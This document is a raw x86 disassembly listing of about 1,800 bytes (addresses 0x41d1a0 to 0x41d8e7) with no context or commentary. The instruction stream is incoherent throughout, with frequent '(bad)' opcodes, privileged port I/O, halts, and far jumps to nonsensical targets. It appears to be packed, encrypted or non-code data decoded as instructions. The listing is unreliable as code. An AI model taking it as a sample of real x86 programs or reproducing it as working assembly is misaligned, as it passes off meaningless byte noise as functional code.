  41d1a0:	stos   DWORD PTR es:[edi],eax
  41d1a1:	dec    esi
  41d1a2:	rcl    BYTE PTR [edi],cl
  41d1a4:	sti    
  41d1a5:	retf   0xb588
  41d1a8:	push   esp
  41d1aa:	icebp  
  41d1ab:	int    0x84
  41d1ad:	add    DWORD PTR [edi],ecx
  41d1af:	mov    bl,0x39
  41d1b1:	jnp    0x41d151
  41d1b3:	js     0x41d190
  41d1b5:	test   al,0x8f
  41d1b7:	es dec ebp
  41d1b9:	cs hlt 
  41d1bb:	jnp    0x41d186
  41d1bd:	aam    0xd
  41d1bf:	jbe    0x41d18a
  41d1c1:	repz std 
  41d1c3:	add    bl,BYTE PTR [eax]
  41d1c5:	ss pushf 
  41d1c7:	int3   
  41d1c8:	(bad)  
  41d1c9:	aam    0xcb
  41d1cb:	dec    ecx
  41d1cc:	fimul  WORD PTR [ebp-0x55207190]
  41d1d2:	mov    edx,0x66085997
  41d1d7:	int    0x68
  41d1d9:	in     al,0xec
  41d1db:	(bad)  
  41d1dc:	lods   al,BYTE PTR ds:[esi]
  41d1dd:	cs sti 
  41d1df:	adc    edi,DWORD PTR [edi-0x80]
  41d1e2:	jg     0x41d1f1
  41d1e4:	and    ah,dl
  41d1e6:	hlt    
  41d1e7:	and    DWORD PTR [ebx],edi
  41d1e9:	sub    BYTE PTR [edi-0x6],0xa9
  41d1ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1ee:	ficomp DWORD PTR [edx]
  41d1f0:	repnz sti 
  41d1f2:	loopne 0x41d270
  41d1f4:	xchg   ebp,eax
  41d1f5:	iret   
  41d1f6:	lea    esp,[ebp-0x5d]
  41d1f9:	dec    eax
  41d1fa:	and    DWORD PTR [esi-0x4252fca6],0xffffffd9
  41d201:	retf   0xa888
  41d204:	inc    edx
  41d205:	push   ebp
  41d206:	retf   0x63d2
  41d209:	push   ecx
  41d20a:	std    
  41d20b:	mov    ebp,0xd7150be2
  41d210:	lea    ebp,es:[esi-0x232cff2f]
  41d217:	and    eax,0x7ecbb73a
  41d21c:	and    bl,BYTE PTR [ebx]
  41d21e:	scas   al,BYTE PTR es:[edi]
  41d21f:	mov    eax,0x3922dd6e
  41d224:	xchg   DWORD PTR [ecx+0x62],ecx
  41d227:	imul   ecx,ebp,0xaea6b9de
  41d22d:	out    dx,eax
  41d22e:	dec    ecx
  41d22f:	sub    edx,DWORD PTR [ecx+0x43b8dad9]
  41d235:	and    cl,BYTE PTR [esi]
  41d237:	add    eax,0x1798875e
  41d23c:	jno    0x41d25f
  41d23e:	js     0x41d25f
  41d240:	rcl    DWORD PTR [esi+0x64929f1b],0x84
  41d247:	popf   
  41d248:	pop    esi
  41d249:	lods   al,BYTE PTR ds:[esi]
  41d24a:	(bad)  
  41d24b:	fld    QWORD PTR [ebp+0x7cbcd043]
  41d251:	inc    edi
  41d252:	fild   WORD PTR [edx-0x42ac0ead]
  41d258:	jb     0x41d224
  41d25a:	sub    BYTE PTR [eax+0x1a1f958f],al
  41d260:	gs icebp 
  41d262:	dec    esp
  41d263:	xchg   ebp,eax
  41d264:	mov    BYTE PTR [ebx-0x53],cl
  41d267:	gs cmc 
  41d269:	mov    ah,bl
  41d26b:	sub    BYTE PTR [ebx],bh
  41d26d:	sbb    eax,0x40414477
  41d272:	push   0x512927e4
  41d277:	add    eax,0x6ebf4e44
  41d27c:	jne    0x41d225
  41d27e:	cmp    BYTE PTR [edi-0x11],0x13
  41d282:	sbb    al,0xc0
  41d284:	xor    BYTE PTR [eax+0x6b58cf56],cl
  41d28a:	mov    ds:0x5e733785,eax
  41d28f:	and    eax,DWORD PTR [edx+0xb]
  41d292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d293:	stos   BYTE PTR es:[edi],al
  41d294:	xchg   ebp,eax
  41d295:	xchg   edx,eax
  41d296:	in     eax,0xe9
  41d298:	addr16 xor eax,0xc8269fbe
  41d29e:	iret   
  41d29f:	pop    ecx
  41d2a0:	popf   
  41d2a1:	data16 add BYTE PTR [edx],cl
  41d2a4:	sbb    esp,ecx
  41d2a6:	jge    0x41d317
  41d2a8:	and    edx,DWORD PTR [esi]
  41d2aa:	adc    al,0x5d
  41d2ac:	xor    al,0x29
  41d2ae:	fldcw  WORD PTR [ebp+0x2a02926]
  41d2b4:	xchg   ebx,eax
  41d2b5:	jae    0x41d2d7
  41d2b7:	in     al,dx
  41d2b8:	fmul   st,st(5)
  41d2ba:	sar    DWORD PTR [edi-0x416c8840],cl
  41d2c0:	adc    cl,al
  41d2c2:	shl    DWORD PTR [ecx+0x75],0x3f
  41d2c6:	out    dx,al
  41d2c7:	mov    ebp,0x2dc669b6
  41d2cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2cd:	inc    ebp
  41d2ce:	test   edi,0xbfd1f9e9
  41d2d4:	test   DWORD PTR [edx],ebp
  41d2d6:	pusha  
  41d2d7:	call   ecx
  41d2d9:	clc    
  41d2da:	add    esi,esp
  41d2dc:	idiv   DWORD PTR [ebp+0x77]
  41d2df:	adc    ecx,ebp
  41d2e1:	jne    0x41d273
  41d2e3:	fadd   QWORD PTR [esi-0x264b5ff9]
  41d2e9:	jl     0x41d314
  41d2eb:	test   eax,0x64e94577
  41d2f0:	mov    BYTE PTR [esi+0x13],al
  41d2f3:	pop    ebx
  41d2f4:	cmp    DWORD PTR [esi+0x2d],ebx
  41d2f7:	push   edx
  41d2f8:	je     0x41d2de
  41d2fa:	add    dh,BYTE PTR [eax]
  41d2fc:	push   eax
  41d2fd:	and    DWORD PTR [edx+0x6c733157],0x8f269f7f
  41d307:	mov    ds:0xad0cf979,eax
  41d30c:	pop    esi
  41d30d:	leave  
  41d30e:	lock bswap ebx
  41d311:	cmp    DWORD PTR [ebx],edi
  41d313:	and    DWORD PTR [esi],0xffffffc6
  41d316:	test   BYTE PTR [ecx+0x628ec037],bl
  41d31c:	jbe    0x41d329
  41d31e:	pop    eax
  41d31f:	cmp    BYTE PTR [ecx],dl
  41d321:	test   BYTE PTR [esi+0x23],ah
  41d324:	fwait
  41d325:	inc    ebp
  41d326:	push   esp
  41d327:	jp     0x41d369
  41d329:	sbb    eax,0xb1effc07
  41d32e:	(bad)  
  41d32f:	pop    ebx
  41d330:	mov    ch,0xbf
  41d332:	stos   BYTE PTR es:[edi],al
  41d333:	mov    DWORD PTR [eax],edi
  41d335:	or     DWORD PTR [ecx-0x9],ebx
  41d338:	cmp    dh,BYTE PTR fs:[esi]
  41d33b:	dec    DWORD PTR [eax]
  41d33d:	and    ebp,DWORD PTR [edx+edi*1-0x4b]
  41d341:	dec    edi
  41d342:	bound  edi,QWORD PTR [esi-0x180fe6cc]
  41d348:	stc    
  41d349:	aas    
  41d34a:	arpl   WORD PTR [ebx],sp
  41d34c:	out    dx,eax
  41d34d:	outs   dx,BYTE PTR ds:[esi]
  41d34e:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d350:	mov    ?,WORD PTR [ecx+0x40627d27]
  41d356:	mov    dh,0x2b
  41d358:	inc    ebx
  41d359:	inc    esi
  41d35a:	int3   
  41d35b:	fnstsw WORD PTR [edx*4+0x23e2329a]
  41d362:	sar    BYTE PTR [eax+0x76c491b2],cl
  41d368:	popf   
  41d369:	(bad)  [ecx]
  41d36b:	push   esp
  41d36c:	ins    DWORD PTR es:[edi],dx
  41d36d:	mov    esp,0xff6780f6
  41d372:	mov    BYTE PTR [edi],al
  41d374:	add    edx,DWORD PTR [edx+0x3a7bc6d2]
  41d37a:	sub    DWORD PTR [ebp-0x6b],ebp
  41d37d:	xchg   ecx,eax
  41d37e:	les    ebx,FWORD PTR [eax+0x766e5cec]
  41d384:	ret    0xbe65
  41d387:	pop    es
  41d388:	scas   eax,DWORD PTR es:[edi]
  41d389:	xor    ebx,ebx
  41d38b:	add    DWORD PTR [eax-0x74],0xffffffd3
  41d38f:	(bad)  
  41d391:	ins    BYTE PTR es:[edi],dx
  41d392:	stos   DWORD PTR es:[edi],eax
  41d393:	sbb    cl,bl
  41d395:	in     al,dx
  41d396:	push   edi
  41d397:	addr16 pop esp
  41d399:	pop    es
  41d39a:	leave  
  41d39b:	add    eax,0xaa62f487
  41d3a0:	and    dl,BYTE PTR [edx]
  41d3a2:	dec    eax
  41d3a3:	scas   eax,DWORD PTR es:[edi]
  41d3a4:	mov    BYTE PTR [ebp+esi*2-0xb],ah
  41d3a8:	std    
  41d3a9:	lock and al,0x23
  41d3ac:	pop    ss
  41d3ad:	inc    esi
  41d3ae:	mov    bh,BYTE PTR es:[eax+eax*8-0x6d]
  41d3b3:	cld    
  41d3b4:	pop    ds
  41d3b5:	inc    esi
  41d3b6:	dec    ebp
  41d3b7:	mov    esp,0x18aef515
  41d3bc:	xor    BYTE PTR cs:[esi+0x5c],cl
  41d3c0:	jnp    0x41d3a7
  41d3c2:	leave  
  41d3c3:	ss cmp al,0xf8
  41d3c6:	and    BYTE PTR ds:0xf356ee14,bh
  41d3cc:	adc    BYTE PTR [eax+eax*2-0x610bdcba],al
  41d3d3:	jno    0x41d399
  41d3d5:	mov    BYTE PTR [ebp-0x98675f1],al
  41d3db:	xor    eax,0x3778cbeb
  41d3e0:	cmp    eax,0xc4b74570
  41d3e5:	fdivr  st(0),st
  41d3e7:	setl   BYTE PTR [esi+eax*1+0x5e]
  41d3ec:	push   edi
  41d3ed:	es into 
  41d3ef:	push   ebp
  41d3f0:	inc    esi
  41d3f1:	jnp    0x41d441
  41d3f3:	mov    fs,WORD PTR [eax-0x3]
  41d3f6:	xor    al,cl
  41d3f8:	jo     0x41d465
  41d3fa:	sub    eax,0xeb98cbfd
  41d3ff:	xchg   ebp,eax
  41d400:	ret    0x6ca3
  41d403:	lahf   
  41d404:	jl     0x41d427
  41d406:	pop    ebp
  41d407:	ret    0x194
  41d40a:	mov    ch,0x19
  41d40c:	imul   esp,DWORD PTR [edx],0x99951d9
  41d412:	push   esp
  41d413:	das    
  41d414:	ss sahf 
  41d416:	int    0xfa
  41d418:	adc    ch,ch
  41d41a:	xor    dh,BYTE PTR [ecx+0x0]
  41d41d:	sbb    al,0x17
  41d41f:	jns    0x41d438
  41d421:	jne    0x41d420
  41d423:	(bad)  
  41d424:	pop    ebx
  41d425:	and    al,0x44
  41d427:	ret    0x2a83
  41d42a:	xchg   ebx,eax
  41d42b:	or     DWORD PTR [ebx+esi*8-0x74],edx
  41d42f:	nop
  41d430:	mov    dl,0xdd
  41d432:	in     al,0x1a
  41d434:	ret    
  41d435:	mov    edx,0xbff9eb51
  41d43a:	push   esi
  41d43b:	sti    
  41d43c:	dec    edx
  41d43d:	inc    esp
  41d43e:	dec    ebp
  41d43f:	lds    esp,FWORD PTR [esi+0x7e]
  41d442:	lds    edx,FWORD PTR [edi]
  41d444:	cs push ebp
  41d446:	(bad)  
  41d447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d448:	popf   
  41d449:	sub    eax,DWORD PTR [ebp+0x5cd6e955]
  41d44f:	xchg   esi,eax
  41d450:	mov    esi,0xb8d7a48a
  41d455:	std    
  41d456:	cld    
  41d457:	mov    edx,0x23a12211
  41d45c:	adc    DWORD PTR [eax],ebp
  41d45e:	mov    bl,0xfa
  41d460:	arpl   WORD PTR [edx+esi*2+0x5fb331c7],bp
  41d467:	xchg   esi,eax
  41d468:	and    ebp,edi
  41d46a:	les    edx,FWORD PTR [edx+0x7f1dac00]
  41d470:	sbb    DWORD PTR [edx+0x3d748c19],edi
  41d476:	call   0xf953a31d
  41d47b:	sub    ebp,DWORD PTR [edi+0x28b8e48e]
  41d481:	push   es
  41d482:	push   es
  41d483:	pop    ecx
  41d484:	inc    esi
  41d485:	dec    ebp
  41d486:	pop    ecx
  41d487:	mov    WORD PTR [edi+0x7a],?
  41d48a:	ror    BYTE PTR [edi+0x47],cl
  41d48d:	(bad)  
  41d48f:	pusha  
  41d490:	imul   ebx,DWORD PTR [esi-0x13],0x3efd7b3
  41d497:	or     al,0x13
  41d499:	fs ins DWORD PTR es:[edi],dx
  41d49b:	add    al,0xfb
  41d49d:	mov    ebp,0x97256768
  41d4a2:	add    ebp,DWORD PTR [edi+eax*1-0x6344fd62]
  41d4a9:	daa    
  41d4aa:	enter  0x6e0a,0xa8
  41d4ae:	push   0xffffff96
  41d4b0:	mov    bh,0x93
  41d4b2:	mov    dh,0x1c
  41d4b4:	je     0x41d49c
  41d4b6:	lock add DWORD PTR [eax],edi
  41d4b9:	fdivrp st(6),st
  41d4bb:	xor    bl,dl
  41d4bd:	(bad)  
  41d4be:	mov    ebp,0xf97597c2
  41d4c3:	shl    esp,cl
  41d4c5:	jg     0x41d4b4
  41d4c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4c8:	or     DWORD PTR [eax+0x2ee465d3],esp
  41d4ce:	inc    eax
  41d4cf:	xchg   bh,al
  41d4d1:	ror    BYTE PTR [eax+0x5d],0x2b
  41d4d5:	call   0xcb5d3cc3
  41d4da:	inc    edx
  41d4db:	scas   eax,DWORD PTR es:[edi]
  41d4dc:	mov    ds:0x43f1b133,al
  41d4e1:	inc    edx
  41d4e2:	call   0xebef3838
  41d4e7:	pop    WORD PTR [ecx-0x48]
  41d4eb:	rcr    edx,0xfc
  41d4ee:	out    0x96,al
  41d4f0:	dec    esp
  41d4f1:	dec    ebp
  41d4f2:	out    0x7d,eax
  41d4f4:	inc    edi
  41d4f5:	stc    
  41d4f6:	pop    ss
  41d4f7:	xchg   edi,eax
  41d4f8:	es jmp 0x41d4c0
  41d4fb:	shl    BYTE PTR [esi+0x3d1a2e9a],0x4
  41d502:	fisub  DWORD PTR [edx]
  41d504:	dec    ecx
  41d505:	pop    ebp
  41d506:	cmp    ebp,DWORD PTR [ebp+0x14]
  41d509:	xchg   ebp,eax
  41d50a:	dec    edi
  41d50b:	cld    
  41d50c:	pop    edx
  41d50d:	repz or ebp,DWORD PTR [ecx-0x68]
  41d511:	sub    eax,0xa48a1818
  41d516:	xlat   BYTE PTR ds:[ebx]
  41d517:	cwde   
  41d518:	cdq    
  41d519:	or     al,0xbe
  41d51b:	xchg   ebp,eax
  41d51c:	aas    
  41d51d:	and    edx,DWORD PTR [ecx]
  41d51f:	fstp   TBYTE PTR [esp+eax*4]
  41d522:	pop    ss
  41d523:	aas    
  41d524:	repnz fcom DWORD PTR [esi+0x7f19de98]
  41d52b:	inc    esp
  41d52c:	sbb    eax,0x3061ac2b
  41d531:	stos   BYTE PTR es:[edi],al
  41d532:	rcr    BYTE PTR [esp+edx*1-0x70],0x2
  41d537:	cdq    
  41d538:	cld    
  41d539:	mov    bl,0x68
  41d53b:	jne    0x41d566
  41d53d:	xor    ah,BYTE PTR [eax-0x44231ec1]
  41d543:	shr    ch,cl
  41d545:	push   ebp
  41d546:	fnsave [ebx]
  41d548:	xchg   ecx,eax
  41d549:	popa   
  41d54a:	jle    0x41d589
  41d54c:	hlt    
  41d54d:	xchg   ebx,eax
  41d54e:	mov    esi,0xf2b56345
  41d553:	mov    bl,0x76
  41d555:	cmp    dh,dl
  41d557:	jp     0x41d570
  41d559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d55a:	add    DWORD PTR ds:0xdc0cef0a,esp
  41d560:	adc    eax,0x165b38a
  41d565:	jl     0x41d543
  41d567:	jno    0x41d57f
  41d569:	or     eax,DWORD PTR [ebx+ecx*2-0x6eff51e]
  41d570:	cmp    al,0xbe
  41d572:	xchg   esi,eax
  41d573:	rcl    BYTE PTR [ecx-0x70ae67b1],1
  41d579:	stos   BYTE PTR es:[edi],al
  41d57a:	ja     0x41d5ca
  41d57c:	inc    edi
  41d57d:	out    dx,al
  41d57e:	sar    DWORD PTR [esi+0x72],cl
  41d581:	shr    ebx,1
  41d583:	adc    eax,0xbbf73640
  41d588:	xor    edi,DWORD PTR [esi+0x4c]
  41d58b:	jno    0x41d559
  41d58d:	iret   
  41d58e:	bound  ebp,QWORD PTR [esi+0x78f5b67c]
  41d594:	call   0x485187da
  41d599:	lds    ebp,FWORD PTR [ebp-0x50]
  41d59c:	dec    ecx
  41d59d:	dec    ebp
  41d59e:	jo     0x41d58c
  41d5a0:	adc    ah,BYTE PTR [ecx+0x779053e7]
  41d5a6:	mov    ch,0xa
  41d5a8:	mov    ds:0xad494236,eax
  41d5ad:	push   ss
  41d5ae:	jmp    0x41d5be
  41d5b0:	pop    esi
  41d5b1:	pusha  
  41d5b2:	cmp    eax,0x64aefe27
  41d5b7:	add    eax,0x8ebeca1e
  41d5bc:	xchg   esp,eax
  41d5bd:	sbb    BYTE PTR [ebx+eiz*1-0x5c],bl
  41d5c1:	inc    eax
  41d5c2:	xchg   esp,eax
  41d5c3:	push   cs
  41d5c4:	cmp    edx,DWORD PTR [esi+0x4a6c537d]
  41d5ca:	xor    BYTE PTR [ecx-0x13],bl
  41d5cd:	jb     0x41d647
  41d5cf:	pushf  
  41d5d0:	clc    
  41d5d1:	sbb    DWORD PTR [ecx-0x3],0x13
  41d5d5:	clc    
  41d5d6:	sbb    eax,edx
  41d5d8:	add    BYTE PTR [ecx],cl
  41d5da:	lds    edx,FWORD PTR [ebp-0x1afcbb90]
  41d5e0:	jg     0x41d57a
  41d5e2:	jmp    DWORD PTR [ebx+0x6462fc63]
  41d5e8:	adc    DWORD PTR [ecx],eax
  41d5ea:	sub    DWORD PTR [edx],0x1e5a43a9
  41d5f0:	adc    ebp,DWORD PTR [esi]
  41d5f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5f3:	retf   0xbe60
  41d5f6:	adc    cl,cl
  41d5f8:	daa    
  41d5f9:	(bad)  
  41d5fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5fb:	pop    esi
  41d5fc:	adc    al,0xc2
  41d5fe:	into   
  41d5ff:	fnstenv [ecx]
  41d601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d602:	mov    ds:0x630d1257,eax
  41d607:	dec    ecx
  41d608:	test   BYTE PTR [ebx+0x3cd98682],bl
  41d60e:	jp     0x41d608
  41d610:	ret    
  41d611:	or     edi,DWORD PTR [ebx-0x42]
  41d614:	xlat   BYTE PTR ds:[ebx]
  41d615:	lahf   
  41d616:	adc    eax,DWORD PTR [edx-0x1b4c7b94]
  41d61c:	outs   dx,DWORD PTR ds:[esi]
  41d61d:	push   esp
  41d61e:	cmp    ebx,0x51
  41d621:	neg    BYTE PTR es:[ebp-0x45642812]
  41d628:	std    
  41d629:	fxch   st(0)
  41d62b:	fisttp WORD PTR [eax-0x51]
  41d62e:	mov    ch,cl
  41d630:	loop   0x41d5c0
  41d632:	sub    BYTE PTR [ebp+0x1c],dl
  41d635:	sub    BYTE PTR [esi],0x4f
  41d638:	push   edi
  41d639:	fisub  DWORD PTR [esp+esi*1+0x2b]
  41d63d:	addr16 push es
  41d63f:	xchg   ebp,eax
  41d640:	and    DWORD PTR [edx+0x10],edx
  41d643:	ja     0x41d66d
  41d645:	mov    esi,0xcf787365
  41d64a:	pop    edx
  41d64b:	call   0xf5bd:0x67860ed9
  41d652:	arpl   WORD PTR [edx+esi*4-0x4396a197],sp
  41d659:	das    
  41d65a:	popa   
  41d65b:	push   edi
  41d65c:	sub    edx,edx
  41d65e:	jno    0x41d627
  41d660:	mov    BYTE PTR [eax+0x62162214],cl
  41d666:	jae    0x41d612
  41d668:	inc    edi
  41d669:	sbb    ah,al
  41d66b:	push   esi
  41d66c:	push   0x3491ba8e
  41d671:	jl     0x41d6cd
  41d673:	repz or bl,ch
  41d676:	xor    eax,0xc219cc4e
  41d67b:	xchg   ecx,eax
  41d67c:	push   edi
  41d67d:	sbb    eax,0xce82c6f
  41d682:	inc    esi
  41d683:	fs movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d686:	mov    bl,0xc7
  41d688:	ja     0x41d67a
  41d68a:	add    ebp,edi
  41d68c:	dec    esp
  41d68d:	lods   al,BYTE PTR ds:[esi]
  41d68e:	repz jnp 0x41d6b6
  41d691:	xor    eax,0x1c9ac7fa
  41d696:	xchg   BYTE PTR [eax],bh
  41d698:	mov    dh,0xc1
  41d69a:	xchg   DWORD PTR [esi],edi
  41d69c:	in     eax,dx
  41d69d:	jge    0x41d662
  41d69f:	fs xor al,0xeb
  41d6a2:	add    esi,edx
  41d6a4:	push   edi
  41d6a5:	dec    esp
  41d6a6:	fdivr  DWORD PTR [edx+0x35a5a195]
  41d6ac:	hlt    
  41d6ad:	ret    
  41d6ae:	idiv   DWORD PTR ds:0x65ec1a00
  41d6b4:	ret    0x6700
  41d6b7:	pushf  
  41d6b8:	outs   dx,BYTE PTR ds:[esi]
  41d6b9:	aaa    
  41d6ba:	or     BYTE PTR ds:0x9ccdc80f,bl
  41d6c0:	loope  0x41d72b
  41d6c2:	mov    BYTE PTR [ebx+0x4a],ch
  41d6c5:	std    
  41d6c6:	mov    al,0x95
  41d6c8:	idiv   ch
  41d6ca:	cmp    ah,BYTE PTR [ecx]
  41d6cc:	push   esp
  41d6cd:	jnp    0x41d686
  41d6cf:	adc    DWORD PTR [edi],edx
  41d6d1:	xchg   dl,cl
  41d6d3:	add    ah,BYTE PTR [esi]
  41d6d5:	lds    ecx,FWORD PTR [esi+ebp*2+0x87897e8]
  41d6dc:	pop    esi
  41d6dd:	es cli 
  41d6df:	lahf   
  41d6e0:	add    dl,dh
  41d6e2:	mov    edx,0xd200467
  41d6e7:	jg     0x41d6f0
  41d6e9:	pop    esi
  41d6ea:	jae    0x41d766
  41d6ec:	int    0x8d
  41d6ee:	idiv   BYTE PTR [esi-0x1c3eefef]
  41d6f4:	fs jmp 0xa86:0x19688819
  41d6fc:	popf   
  41d6fd:	dec    ebp
  41d6fe:	sub    dh,ch
  41d700:	js     0x41d777
  41d702:	add    BYTE PTR [ebx],bl
  41d704:	sub    dl,cl
  41d706:	jmp    0x41d783
  41d708:	inc    edi
  41d709:	dec    edx
  41d70a:	aaa    
  41d70b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d70c:	dec    edi
  41d70d:	fcom   DWORD PTR [edx+0x43]
  41d710:	inc    esi
  41d711:	cmp    DWORD PTR [edx+0x56],edi
  41d714:	jmp    0x41d6da
  41d716:	jecxz  0x41d6e9
  41d718:	push   esp
  41d719:	aaa    
  41d71a:	pop    ebp
  41d71b:	or     bl,al
  41d71d:	sub    bh,BYTE PTR [edi+0x5c34762e]
  41d723:	test   eax,0xec5120c6
  41d728:	mov    al,0xe0
  41d72a:	rcr    DWORD PTR [ebx+edi*4],0xd9
  41d72e:	xchg   BYTE PTR [ebx-0x42],dh
  41d731:	cmp    DWORD PTR [ebp-0x45],ebp
  41d734:	adc    edi,DWORD PTR [ebp+0x75fd555c]
  41d73a:	out    dx,al
  41d73b:	retf   0x7348
  41d73e:	in     eax,dx
  41d73f:	imul   DWORD PTR [ebp-0x65]
  41d742:	dec    edi
  41d743:	ja     0x41d6dc
  41d745:	or     BYTE PTR [eax],dh
  41d747:	scas   al,BYTE PTR es:[edi]
  41d748:	add    eax,0x790114bd
  41d74d:	pop    eax
  41d74e:	xor    eax,0xb7dd1ddb
  41d753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d754:	hlt    
  41d755:	cmp    BYTE PTR [ebp-0x14fd03f8],al
  41d75b:	mov    esi,0x5969a6c9
  41d760:	ins    BYTE PTR es:[edi],dx
  41d761:	aad    0x5e
  41d763:	push   eax
  41d764:	push   edx
  41d765:	adc    cl,0x12
  41d768:	adc    ch,cl
  41d76a:	xor    eax,0xd70acb38
  41d76f:	enter  0xe3f6,0xd6
  41d773:	push   ebp
  41d774:	idiv   eax
  41d776:	test   BYTE PTR [esi+ebx*4+0x3c3f1f28],ah
  41d77d:	dec    edi
  41d77e:	in     al,dx
  41d77f:	sbb    al,0xfa
  41d781:	jecxz  0x41d768
  41d783:	ja     0x41d707
  41d785:	jmp    0xa80ece1f
  41d78a:	inc    edx
  41d78b:	mov    al,ds:0x5efbc94b
  41d790:	jbe    0x41d79c
  41d792:	xlat   BYTE PTR ds:[ebx]
  41d793:	adc    BYTE PTR [edx],bl
  41d795:	push   ecx
  41d796:	xchg   esp,eax
  41d797:	jge    0x41d77d
  41d799:	loop   0x41d7bd
  41d79b:	or     esp,ebp
  41d79d:	int3   
  41d79e:	sbb    DWORD PTR [esi+0x68],0x66
  41d7a2:	clc    
  41d7a3:	xor    al,0x7f
  41d7a5:	push   es
  41d7a6:	nop
  41d7a7:	push   ss
  41d7a8:	mov    BYTE PTR [esi-0x73c0fe30],ah
  41d7ae:	or     eax,0x3a4ada05
  41d7b3:	into   
  41d7b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7b5:	xchg   esp,eax
  41d7b6:	dec    esi
  41d7b7:	repz mov dl,0x69
  41d7ba:	scas   eax,DWORD PTR es:[edi]
  41d7bb:	bound  ecx,QWORD PTR [ebp-0x2c]
  41d7be:	xchg   DWORD PTR [ebx+0x295784a7],esp
  41d7c4:	inc    ebx
  41d7c5:	imul   esi,DWORD PTR [eax+0x23],0xffffffef
  41d7c9:	lods   al,BYTE PTR ds:[esi]
  41d7ca:	push   edx
  41d7cb:	les    eax,FWORD PTR [ebx+ebx*1-0x20f04574]
  41d7d2:	xchg   ebx,eax
  41d7d3:	sar    BYTE PTR [edi],1
  41d7d5:	cmp    al,0xb0
  41d7d7:	or     eax,0xbbb4c32b
  41d7dc:	jae    0x41d785
  41d7de:	and    DWORD PTR [eax+eiz*1],0xffffffce
  41d7e2:	push   esp
  41d7e3:	xlat   BYTE PTR ds:[ebx]
  41d7e4:	stos   BYTE PTR es:[edi],al
  41d7e5:	out    0x76,eax
  41d7e7:	inc    DWORD PTR [ebx+0x5557cba8]
  41d7ed:	in     eax,dx
  41d7ee:	lahf   
  41d7ef:	jae    0x41d7e4
  41d7f1:	call   0x83fb:0x9ca777d6
  41d7f8:	add    BYTE PTR [edi-0x10],cl
  41d7fb:	inc    esp
  41d7fc:	jo     0x41d826
  41d7fe:	xchg   ebx,eax
  41d7ff:	fdivr  QWORD PTR [edx-0x5c]
  41d802:	fisubr DWORD PTR [edi-0x72]
  41d805:	je     0x41d879
  41d807:	jge    0x41d7b4
  41d809:	cmp    BYTE PTR [ebx],dl
  41d80b:	loope  0x41d867
  41d80d:	stos   DWORD PTR es:[edi],eax
  41d80e:	adc    DWORD PTR [ecx+0xf],eax
  41d811:	data16 cmp ch,BYTE PTR [ecx]
  41d814:	cmp    eax,0x9ab1a6b8
  41d819:	inc    edx
  41d81a:	stc    
  41d81b:	fstp   TBYTE PTR [bx+di-0x3e]
  41d81f:	mov    ch,cl
  41d821:	sbb    ebx,ecx
  41d823:	das    
  41d824:	mov    DWORD PTR [edx+eax*2-0x5d5ccbec],edi
  41d82b:	in     eax,dx
  41d82c:	setns  BYTE PTR [ecx+esi*1+0x62b83ca6]
  41d834:	cmp    eax,0x4a14929b
  41d839:	cmp    BYTE PTR [ecx-0x1465e2e0],cl
  41d83f:	repnz pop ebp
  41d841:	jmp    0x420d:0x3b484e2d
  41d848:	cmp    al,0x78
  41d84a:	mov    ecx,0x58506339
  41d84f:	mov    ds:0x8ed07c1c,eax
  41d854:	jge    0x41d838
  41d856:	add    dh,BYTE PTR [esi-0x42]
  41d859:	outs   dx,DWORD PTR ds:[esi]
  41d85a:	mov    BYTE PTR [ebp+ebp*4-0x6352509],bh
  41d861:	les    ecx,FWORD PTR [eax]
  41d863:	mov    bl,0xa2
  41d865:	jl     0x41d855
  41d867:	mov    edi,0xa4b5f0dc
  41d86c:	dec    eax
  41d86d:	xor    DWORD PTR [ebx-0x58],ebp
  41d870:	or     BYTE PTR [esi+0x51],bl
  41d873:	fisub  DWORD PTR [edx+0x43]
  41d876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d877:	in     al,dx
  41d878:	fldenv [edx-0x26]
  41d87b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d87c:	popf   
  41d87d:	jae    0x41d835
  41d87f:	imul   edi,DWORD PTR [eax],0x83c46f3e
  41d885:	sbb    esp,esp
  41d887:	and    al,0x16
  41d889:	inc    esi
  41d88a:	(bad)  [ecx+0x3c1921fa]
  41d890:	rol    DWORD PTR [ecx],cl
  41d892:	sbb    ah,dh
  41d894:	xor    BYTE PTR [edx+0x56],0x2f
  41d898:	mov    dl,0x4f
  41d89a:	sub    DWORD PTR [ecx-0xc888ff9],eax
  41d8a0:	lahf   
  41d8a1:	rol    BYTE PTR [ebx+eax*1],0x39
  41d8a5:	fsubr  QWORD PTR [ebx-0x5a]
  41d8a8:	dec    ecx
  41d8a9:	xlat   BYTE PTR ds:[ebx]
  41d8aa:	nop
  41d8ab:	aaa    
  41d8ac:	xor    BYTE PTR [ecx+0x2c],dh
  41d8af:	pop    es
  41d8b0:	sub    DWORD PTR [ecx+0x33],esp
  41d8b3:	xor    eax,0xc3e53baa
  41d8b8:	cmp    eax,0xd195ba0
  41d8bd:	jmp    0xaa21:0x796234ca
  41d8c4:	cmp    cl,dh
  41d8c6:	or     BYTE PTR [edx+0x47afa06e],dh
  41d8cc:	in     eax,dx
  41d8cd:	mul    DWORD PTR [edx]
  41d8cf:	int    0x9b
  41d8d1:	dec    ebp
  41d8d2:	cdq    
  41d8d3:	add    ecx,DWORD PTR [ebx]
  41d8d5:	std    
  41d8d6:	and    al,0xa1
  41d8d8:	mov    esi,edi
  41d8da:	cs cmp cl,0x3
  41d8de:	mov    bl,0x72
  41d8e0:	popf   
  41d8e1:	xchg   edx,eax
  41d8e2:	pusha  
  41d8e3:	(bad)  
  41d8e4:	fidivr WORD PTR [edx+0x27]
  41d8e7:	in     eax,dx
